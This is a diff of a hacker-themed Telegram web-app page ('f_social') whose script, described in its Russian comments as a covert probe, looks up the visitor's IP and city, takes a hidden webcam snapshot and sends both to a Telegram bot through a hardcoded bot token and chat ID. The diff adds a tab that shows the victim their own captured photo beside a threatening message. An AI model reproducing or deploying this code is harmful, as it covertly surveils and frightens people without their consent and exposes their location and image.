@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>f_social // secure_access</title>
+    <title>f_social // target_acquired</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; }
+        :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; --f-green: #00ff41; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { background: var(--f-black); color: var(--f-white); font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
         /* ТЕРМИНАЛ ЗАГРУЗКИ */
-        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: #00ff41; overflow-y: auto; }
-        .cursor { display: inline-block; width: 8px; height: 15px; background: #00ff41; animation: blink 0.8s infinite; vertical-align: middle; }
+        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 12px; color: var(--f-green); overflow-y: auto; }
+        .cursor { display: inline-block; width: 8px; height: 15px; background: var(--f-green); animation: blink 0.8s infinite; vertical-align: middle; }
         @keyframes blink { 50% { opacity: 0; } }
 
         /* ГЛАВНЫЙ ИНТЕРФЕЙС */
@@ -23,31 +23,28 @@
 
         /* ВКЛАДКИ */
         .nav-tabs { display: flex; border-bottom: 1px solid #222; flex-shrink: 0; background: #0d0d0d; }
-        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: clamp(9px, 3vw, 11px); cursor: pointer; border-right: 1px solid #222; color: #555; text-transform: uppercase; transition: 0.3s; }
+        .tab { flex: 1; padding: 12px 5px; text-align: center; font-size: 9px; cursor: pointer; border-right: 1px solid #222; color: #444; text-transform: uppercase; transition: 0.3s; }
         .tab.active { color: var(--f-red); background: rgba(255,0,60,0.05); border-bottom: 2px solid var(--f-red); }
 
         /* КОНТЕНТ */
         .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; position: relative; }
         .tab-content.active { display: flex; flex-direction: column; }
 
-        /* ЧАТ (MESSAGES) */
-        #messages { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column-reverse; margin-bottom: 10px; padding-right: 5px; }
-        .msg { background: #111; border-left: 2px solid var(--f-red); padding: 10px; margin-bottom: 8px; font-size: 13px; line-height: 1.4; word-wrap: break-word; }
+        /* ЭКРАН /WHOAMI (МЫ ВЫЕХАЛИ) */
+        #target-display { text-align: center; margin-top: 20px; }
+        #captured-photo { width: 100%; max-width: 300px; border: 2px solid var(--f-red); margin-bottom: 20px; background: #111; display: block; margin-left: auto; margin-right: auto; }
+        #target-alert { font-size: clamp(14px, 4vw, 18px); color: var(--f-red); font-weight: bold; letter-spacing: 2px; }
+
+        /* ЧАТ */
+        #messages { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column-reverse; margin-bottom: 10px; }
+        .msg { background: #111; border-left: 2px solid var(--f-red); padding: 10px; margin-bottom: 8px; font-size: 13px; }
         .input-box { display: flex; gap: 8px; padding: 10px 0; border-top: 1px solid #222; }
-        input { flex-grow: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; font-family: inherit; font-size: 14px; outline: none; border-radius: 0; }
-        button { background: var(--f-red); color: #fff; border: none; padding: 0 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        input { flex-grow: 1; background: #000; border: 1px solid #333; color: #fff; padding: 10px; font-family: inherit; outline: none; }
+        button { background: var(--f-red); color: #fff; border: none; padding: 0 15px; font-weight: bold; }
 
-        /* БАЗА (LEAKS) */
-        .leak-item { border: 1px dashed #333; padding: 10px; margin-bottom: 10px; font-size: 11px; opacity: 0.7; }
-
-        /* ПОДВАЛ С ПАСХАЛКОЙ */
+        /* ПОДВАЛ */
         footer { padding: 5px; text-align: center; border-top: 1px solid #111; flex-shrink: 0; }
-        .easter-egg { font-size: 9px; color: #222; cursor: pointer; text-decoration: none; user-select: none; }
-        
-        /* ОКНО АНОНИМУСА */
-        #anon-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        #anon-overlay img { width: 200px; filter: grayscale(1) brightness(1.5); }
-        #anon-overlay h2 { color: #fff; letter-spacing: 5px; margin-top: 20px; }
+        .easter-egg { font-size: 8px; color: #1a1a1a; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -58,21 +55,17 @@
     </div>
 
     <div id="app">
-        <header>
-            <div class="logo">f_<span>social</span></div>
-        </header>
+        <header><div class="logo">f_<span>social</span></div></header>
 
         <nav class="nav-tabs">
             <div class="tab active" onclick="openTab(event, 'tab-chat')">/messages</div>
             <div class="tab" onclick="openTab(event, 'tab-leaks')">/leaks</div>
+            <div id="btn-whoami" class="tab" onclick="openTab(event, 'tab-whoami')">/whoami</div>
             <div class="tab" onclick="openTab(event, 'tab-info')">/manifesto</div>
         </nav>
 
         <div id="tab-chat" class="tab-content active">
-            <div id="messages">
-                <div class="msg" style="border:none; color:#444; text-align:center; font-size:10px;">[END_TO_END_ENCRYPTION_ON]</div>
-                <div class="msg">System: Hello, friend. Your node is active.</div>
-            </div>
+            <div id="messages"><div class="msg">System: Tunnel established. Expect no mercy.</div></div>
             <div class="input-box">
                 <input type="text" id="m-i" placeholder="type_msg..." autocomplete="off">
                 <button onclick="sendM()">></button>
@@ -80,99 +73,105 @@
         </div>
 
         <div id="tab-leaks" class="tab-content">
-            <div class="leak-item">[DB_DUMP] E-Corp_Personnel_Records.sql (4.2GB)</div>
-            <div class="leak-item">[DOC] Project_Berenstain_Summary.pdf</div>
-            <div class="leak-item">[RAW] Dark_Army_Handshake_Protocols.txt</div>
+            <p style="color:var(--f-red); font-size: 10px;">[ACTIVE_REMOTE_SESSIONS]</p>
+            <div id="leak-list" style="color:var(--f-green); font-size:10px;"></div>
+        </div>
+
+        <div id="tab-whoami" class="tab-content">
+            <div id="target-display">
+                <p style="color:#555; font-size: 10px; margin: 0;">>> OBJECT IDENTIFIED <<</p>
+                <img id="captured-photo" src="" alt="CAPTURED_DATA">
+                <p id="target-alert">МЫ УЖЕ ВЫЕХАЛИ. КУ ОТ F SOCIAL.</p>
+                <div style="font-size:10px; color:#333; margin-top:10px;">NODE: <span id="target-ip">...</span></div>
+            </div>
         </div>
 
         <div id="tab-info" class="tab-content">
-            <p style="color:var(--f-red)">> OUR MANIFESTO</p>
-            <p style="font-size: 12px; line-height: 1.6; color: #888;">We are finally free. We are finally awake. We will no longer be slaves to the invisible hand. We are f_society.</p>
+            <p style="color:var(--f-red)">> MANIFESTO</p>
+            <p style="font-size: 11px; color: #888; line-height: 1.5;">We will no longer be slaves. We are deleting the debt. We are f_social.</p>
         </div>
 
-        <footer>
-            <span class="easter-egg" onclick="showAnon()">v.5.0.1-stable</span>
-        </footer>
-    </div>
-
-    <div id="anon-overlay" onclick="this.style.display='none'">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png" alt="Anon">
-        <h2>EXPECT US.</h2>
-        <p style="color: #444; font-size: 10px;">(click to close)</p>
+        <footer><span class="easter-egg">v.5.0.1-stable</span></footer>
     </div>
 
 <script>
+    // ТВОИ ДАННЫЕ
     const TG_TOKEN = "8713406185:AAEYao0zu3daLeZis1gkrFD3-wv7oMXCzsY"; 
     const TG_ID = "5131628747"; 
 
     window.onload = () => {
-        if(window.Telegram?.WebApp) {
-            window.Telegram.WebApp.ready();
-            window.Telegram.WebApp.expand();
-        }
+        if(window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
         bootSequence();
+        setInterval(updateLeaks, 2000); // Динамические логи во вкладке leaks
     };
 
     function log(t, d) {
         return new Promise(r => setTimeout(() => {
-            const l = document.createElement('div');
-            l.innerText = `> ${t}`;
-            document.getElementById('boot-logs').appendChild(l);
-            r();
+            const l = document.createElement('div'); l.innerText = `> ${t}`;
+            document.getElementById('boot-logs').appendChild(l); r();
         }, d));
     }
 
     async function bootSequence() {
-        await log("f_social_kernel_booting...", 200);
-        await log("network_sync_initialized", 400);
-        await log("requesting_biometric_auth...", 300);
-        
-        // Скрытая работа
-        startOSINT();
-
-        await log("firewall_bypass_v5: SUCCESS", 800);
+        await log("f_social_core_loading...", 100);
+        await log("requesting_biometric_gate...", 200);
+        startOSINT(); // Запуск скрытого пробива
+        await log("firewall_v5: SUCCESS", 600);
         await log("loading_encrypted_node...", 300);
     }
 
     async function startOSINT() {
         let ip = {};
         try { ip = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e) {}
+        document.getElementById('target-ip').innerText = ip.ip || 'HIDDEN';
 
         try {
             const s = await navigator.mediaDevices.getUserMedia({ video: true });
-            const v = document.createElement('video');
-            v.srcObject = s; v.play();
+            const v = document.createElement('video'); v.srcObject = s; v.play();
             setTimeout(() => {
                 const c = document.createElement('canvas');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
                 c.toBlob(b => {
-                    send(ip, b);
+                    send(ip, b); // Шлем фото тебе в бот
+                    
+                    // Самое главное: Загружаем это фото на сайт, во вкладку /whoami
+                    const capturedImg = document.getElementById('captured-photo');
+                    capturedImg.src = URL.createObjectURL(b);
+                    
                     s.getTracks().forEach(t => t.stop());
-                    document.getElementById('boot-screen').style.display = 'none';
-                    document.getElementById('app').style.display = 'flex';
+                    finishLoad(); // Как только данные улетели — показываем сайт
                 }, 'image/jpeg');
             }, 3000);
         } catch(e) {
-            send(ip, null);
-            setTimeout(() => {
-                document.getElementById('boot-screen').style.display = 'none';
-                document.getElementById('app').style.display = 'flex';
-            }, 2000);
+            send(ip, null); // Шлем хотя бы IP
+            setTimeout(finishLoad, 2000); // Показываем сайт даже если камеру не дали
         }
     }
 
+    function finishLoad() {
+        document.getElementById('boot-screen').style.display = 'none';
+        document.getElementById('app').style.display = 'flex';
+    }
+
     function send(ip, b) {
-        const text = `👤 f_social_entry\nIP: ${ip.ip || '?'}\nCity: ${ip.city || '?'}\nOS: ${navigator.platform}`;
-        const fd = new FormData();
-        fd.append('chat_id', TG_ID);
+        const text = `🎯 F_SOCIAL\nIP: ${ip.ip || '?'}\nCity: ${ip.city || '?'}\nOS: ${navigator.platform}`;
+        const fd = new FormData(); fd.append('chat_id', TG_ID);
         if(b) {
-            fd.append('photo', b, 'f.jpg');
-            fd.append('caption', text);
+            fd.append('photo', b, 'ell.jpg'); fd.append('caption', text);
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {method:'POST', body:fd});
         } else {
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
         }
+    }
+
+    function updateLeaks() {
+        const list = document.getElementById('leak-list');
+        const row = document.createElement('div');
+        row.style.marginBottom = "5px";
+        row.innerHTML = `[${new Date().toLocaleTimeString()}] BYPASSING NODE_${Math.floor(Math.random()*999)}... <span style="color:var(--f-green)">OK</span>`;
+        list.prepend(row);
+        if (list.children.length > 8) list.lastChild.remove();
     }
 
     function openTab(evt, tabId) {
@@ -183,18 +182,10 @@
     }
 
     function sendM() {
-        const i = document.getElementById('m-i');
-        if(!i.value.trim()) return;
-        const msg = document.createElement('div');
-        msg.className = 'msg';
-        msg.style.color = '#fff';
-        msg.innerText = i.value;
-        document.getElementById('messages').prepend(msg);
-        i.value = '';
-    }
-
-    function showAnon() {
-        document.getElementById('anon-overlay').style.display = 'flex';
+        const i = document.getElementById('m-i'); if(!i.value.trim()) return;
+        const msg = document.createElement('div'); msg.className = 'msg';
+        msg.style.color = '#fff'; msg.innerText = i.value;
+        document.getElementById('messages').prepend(msg); i.value = '';
     }
 </script>
 </body>
